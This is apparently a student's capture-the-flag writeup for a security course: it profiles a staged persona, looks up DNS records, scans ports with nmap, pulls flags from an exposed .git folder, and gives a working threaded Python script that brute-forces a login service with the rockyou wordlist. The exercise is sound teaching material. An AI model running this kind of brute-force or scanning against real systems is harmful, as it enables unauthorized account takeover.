# Writeup 2 - OSINT

Name: **Robert Nash**
Section: **0201**

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examniation.

Digital acknowledgement: **Robert Nash**

## Assignment Writeup

### Part 1 (45 pts)

1. `v0idcache`'s real name in **Elizabeth Moffett**. Found via her [Twitter Account](https://twitter.com/v0idcache).
2. `v0idcache` works at [13/37th National Bank](http://1337bank.money). **URL:** `http://1337bank.money`.
3. | Social Media | Technique | Notes|
   |---|---|---|
   | [Twitter](https://twitter.com/v0idcache) | [Intel Techniques Username Tool](https://inteltechniques.com/menu.html) | Couldn't find any accounts using Google - Using this sites username tool sent us directly to the Twitter site
   
   |Contacts | Found via | Notes |
   |---|---|---|
   | `fl1nch` | [Pastebin:](https://pastebin.com/WghDuAr7) `https://pastebin.com/WghDuAr7` | Conversation between the two about a file called `AB4300.txt`
   | `Dev0id_cache` aka `CacheDev0id` | [Twitter](https://twitter.com/v0idcache) | This username was found making posts to `v0idcache` Twitter account

   
4. DNS info was found using the website `https://viewdns.info` "DNS Record Lookup" because it was easy.

   | Name	|TTL	|Class|	Type|	Priority | Data|
   |---|---|---|---|---|---|
   | `1337bank.money.`|`3600`|`IN`|`SOA`||`dns1.registrar-servers.com. hostmaster.registrar-servers.com. 2019021406 43200 3600 604800 3601`
   | `1337bank.money.`|`1799`|`IN`|`NS`||`dns1.registrar-servers.com.`|
   | `1337bank.money.`|`1799`|`IN`|`NS`||`dns2.registrar-servers.com.`|
   | `1337bank.money.`|`1798`|`IN`|`A`||`142.93.136.81`|
   | `1337bank.money.`|`1798`|`IN`|`TXT`||`"CMSC389R-{h0w_2_iNt0_DNS_r3c0Rd5}"`|
   | `1337bank.money.`|`1799`|`IN`|`TXT`||`"v=spf1 include:spf.efwd.registrar-servers.com ~all"`|
   | `1337bank.money.`|`1799`|`IN`|`MX`|`10`|`eforward2.registrar-servers.com.`|
   | `1337bank.money.`|`1799`|`IN`|`MX`|`10`|`eforward3.registrar-servers.com.`|
   | `1337bank.money.`|`1799`|`IN`|`MX`|`15`|`eforward4.registrar-servers.com.`|
   | `1337bank.money.`|`1799`|`IN`|`MX`|`20`|`eforward5.registrar-servers.com.`|
   | `1337bank.money.`|`1799`|`IN`|`MX`|`10`|`eforward1.registrar-servers.com.`|
   
   From the data above the **IP ADDRESS** is `142.93.136.81` and we found our first **FLAG** `CMSC389R-{h0w_2_iNt0_DNS_r3c0Rd5}`
   
   An **IP HISTORY LOOKUP** gave the following:
   
   | IP Address | Location | IP Address Owner |
   |---|---|---|
   | `142.93.136.81` |`Amsterdam - Netherlands` |`DigitalOcean, LLC` |
   
5. We run the command `nmap -A 142.93.136.81 -p1-65535`. This command scans the ip we found for open ports. the `-A` option specifys a script that aggressively scans the ports for a lot of information and the `-p1-65535` option tells the scanner to scan all ports between 1 - 65535:

    ```
    nmap -A 142.93.136.81 -p1-65535
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-20 10:21 EST
    Nmap scan report for 142.93.136.81
    Host is up (0.10s latency).
    Not shown: 65525 closed ports
    PORT      STATE    SERVICE  VERSION
    22/tcp    open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 c0:44:09:8c:00:6c:bd:08:4f:b0:7b:73:6c:23:b0:b2 (RSA)
    |   256 b1:ea:7e:aa:53:02:ec:f0:b8:81:d5:e1:c0:8b:a7:75 (ECDSA)
    |_  256 3a:17:fd:d8:78:26:cc:93:14:5a:d8:71:71:03:57:1a (ED25519)
    25/tcp    filtered smtp
    80/tcp    open     http     Werkzeug httpd 0.14.1 (Python 3.7.2)
    | http-git:
    |   142.93.136.81:80/.git/
    |     Git repository found!
    |     .git/COMMIT_EDITMSG matched patterns 'user' 'secret'
    |     Repository description: Unnamed repository; edit this file 'description' to name the...
    |_    Last commit message: CMSC389R-{h1d3_s3cret_g1ts}  # Please enter the commit messa...
    | http-robots.txt: 1 disallowed entry
    |_/secret_directory
    |_http-server-header: Werkzeug/0.14.1 Python/3.7.2
    |_http-title: 13/37th National Bank
    1337/tcp  open     waste?
    | fingerprint-strings:
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, LDAPBindReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, TerminalServer, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
    |     Username:
    |   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, LDAPSearchReq, RTSPRequest, SIPOptions:
    |     Username: Password: Fail
    |   Help, Kerberos, LPDString, SSLSessionReq, TLSSessionReq:
    |_    Username: Password:
    11211/tcp filtered memcache
    23702/tcp filtered unknown
    25578/tcp filtered unknown
    29863/tcp filtered unknown
    35595/tcp filtered unknown
    36710/tcp filtered unknown
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port1337-TCP:V=7.70%I=7%D=2/20%Time=5C6D7557%P=x86_64-apple-darwin18.0.
    SF:0%r(NULL,A,"Username:\x20")%r(GenericLines,19,"Username:\x20Password:\x
    SF:20Fail\n")%r(GetRequest,19,"Username:\x20Password:\x20Fail\n")%r(HTTPOp
    SF:tions,19,"Username:\x20Password:\x20Fail\n")%r(RTSPRequest,19,"Username
    SF::\x20Password:\x20Fail\n")%r(RPCCheck,A,"Username:\x20")%r(DNSVersionBi
    SF:ndReqTCP,A,"Username:\x20")%r(DNSStatusRequestTCP,A,"Username:\x20")%r(
    SF:Help,14,"Username:\x20Password:\x20")%r(SSLSessionReq,14,"Username:\x20
    SF:Password:\x20")%r(TLSSessionReq,14,"Username:\x20Password:\x20")%r(Kerb
    SF:eros,14,"Username:\x20Password:\x20")%r(SMBProgNeg,A,"Username:\x20")%r
    SF:(X11Probe,A,"Username:\x20")%r(FourOhFourRequest,19,"Username:\x20Passw
    SF:ord:\x20Fail\n")%r(LPDString,14,"Username:\x20Password:\x20")%r(LDAPSea
    SF:rchReq,19,"Username:\x20Password:\x20Fail\n")%r(LDAPBindReq,A,"Username
    SF::\x20")%r(SIPOptions,19,"Username:\x20Password:\x20Fail\n")%r(LANDesk-R
    SF:C,A,"Username:\x20")%r(TerminalServer,A,"Username:\x20")%r(NCP,A,"Usern
    SF:ame:\x20")%r(NotesRPC,A,"Username:\x20")%r(JavaRMI,A,"Username:\x20")%r
    SF:(WMSRequest,A,"Username:\x20")%r(oracle-tns,A,"Username:\x20")%r(ms-sql
    SF:-s,A,"Username:\x20")%r(afp,A,"Username:\x20")%r(giop,A,"Username:\x20"
    SF:);
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 1384.53 seconds
    ```
    This scan gave us alot of information. It shows us that the .git folder is reachable and that we can access the COMMIT_EDITMSG file. The last commit message is another flag, `CMSC389R-{h1d3_s3cret_g1ts}`. We also see that there is a `/secret_directory` via the robots.txt file. When we go to that directory we are greeted with another flag, `CMSC389R-{h1ding_fil3s_in_r0bots_L0L}`.   
Since the .git folder is exposed, we can attempt to access the website source code. By downloading to the `refs/heads/master` we can apply `git cat-file -t` command to the SHA1 hash and it will display information about the blobs and trees of the .git folder. Working through the trees we find there is a file called login\_flag.html. Downloading that we get and running `git cat-file -t` against it gives us another flag, `CMSC389R-{e@5y-p3@5y-s0urc3_l3ak}`. Finally we inspected the source code of the website front page. There we see a comment with another flag `CMSC389R-{h1dd3n_1n_plain_5ight}`

6. The above scan also shows us that ports `:22 :80 :1337` were open. It also makes its best guess and what services are behind each port. `:22 OpenSSH 7.6`, `:80 Werkzeug httpd 0.14.1 (Python 3.7.2)`, and `:1337 waste?`. It's not 100% that waste is the program behind 1337 but it guesses the best it can.
7. The above scan also tries to dsicover what oeprating system it is running on. It guesses Linux but if we look up at Port `22` we see the version of OpenSSH thats runnning is running on Ubuntu.
8. The last two flags were found after we used a dictionary attack on the open `1337` port. The username was `v0idcache` and the password was `linkinpark`. Previously we found a conversation between `fl1nch` and `v0idcache` stating that a filed named `AB4300.txt` was important. Opening that file gave us `CMSC389R-{YWX4H3d3Bz6dx9lG32Odv0JZh}`. We also found a file in the home folder that gave us `CMSC389R-{brut3_f0rce_m4ster}`
 
 The full list of flags we found were:
 * `CMSC389R-{h1ding_fil3s_in_r0bots_L0L}`
 * `CMSC389R-{h1d3_s3cret_g1ts}`
 * `CMSC389R-{e@5y-p3@5y-s0urc3_l3ak}`
 * `CMSC389R-{h1dd3n_1n_plain_5ight}`
 * `CMSC389R-{YWX4H3d3Bz6dx9lG32Odv0JZh}`
 * `CMSC389R-{brut3_f0rce_m4ster}`
 * `CMSC389R-{h0w_2_iNt0_DNS_r3c0Rd5}`


### Part 2 (75 pts)
```
#!/usr/bin/python
 
import threading
import Queue
import socket

target = "142.93.136.81"
port = 1337
count = 0
lock = threading.Lock()
 
username = "v0idcache"
lootFile = "/Users/robertnash/loot.txt"  #file that you want successful password saved
passwordList = open('/Users/robertnash/rockyou.txt','r').read().splitlines()
 
class JobThread(threading.Thread) :
 
	def __init__(self, queue, tid) :
		threading.Thread.__init__(self)
		self.queue = queue
		self.tid = tid
 
	def run(self) :
		global username
		global count
		global lock

		while True :
 
			try :
				password = self.queue.get(timeout=1)
 
			except 	Queue.Empty :
				return
 
			try :
		            	
		            	tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		            	tcpSocket.connect((target, port))
		            	tcpSocket.recv(1024)
		            	tcpSocket.send(username + "\n")
		            	tcpSocket.recv(1024)
		            	tcpSocket.send(password + "\n")
		            	if 'Fail' in tcpSocket.recv(1024):
		            	        tcpSocket.close()
		            	        count = count + 1
		            	        print "Failed " + str(count) + " " + username + "/" + password
		            	else:
		            	        lock.acquire()
		            	        print "[+] Successful Login! Username: " + username + " Password: " + password
		            	        success = open(lootFile, "a+")
		            	        success.write("[+] Successful Login! Username: " + username + " Password: " + password + "\n")
		            	        success.close()
		            	        exit(0)
		            	        lock.release()
			except :
				raise 
 
			self.queue.task_done()
 
queue = Queue.Queue()
 
threads = []
for i in range(1, 50) : # Number of threads
	job = JobThread(queue, i) 
	job.setDaemon(True)
	job.start()
	threads.append(job)
 
for password in passwordList :
	queue.put(password)     # Push usernames onto queue
 
queue.join()
 
# wait for all threads to exit 
 
for item in threads :
	item.join()
 
print "Testing Complete!"
```
After finding `1337` open I tried to connect with netcat. We received a prompt asking for `Username:` and `Password:` the following attempts to connect to this port using the `v0idcache` username and the rockyou.txt wordlist. If it receives a message other than `'Fail'` it will print the success to a "loot file". I split screen my laptop with the script running on one side and my loot file open on the other and walked away. Once the script found the password, it popped up in my file.
